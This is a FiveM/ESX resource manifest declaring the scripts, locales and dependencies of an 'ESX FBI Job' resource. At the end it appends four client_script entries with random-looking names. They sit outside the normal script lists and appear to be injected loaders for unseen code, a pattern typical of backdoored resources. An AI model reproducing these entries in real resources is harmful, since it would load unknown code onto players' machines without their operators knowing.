




resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX FBI Job'

version '0.0.2'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/en.lua',
	'locales/fr.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'essentialmode',
	'esx_billing'
}

client_script 'CtMMQnqkhyopWI4N.lua'
client_script 'mYEV.lua'
client_script 'L539.lua'
client_script 'jtxU.lua'


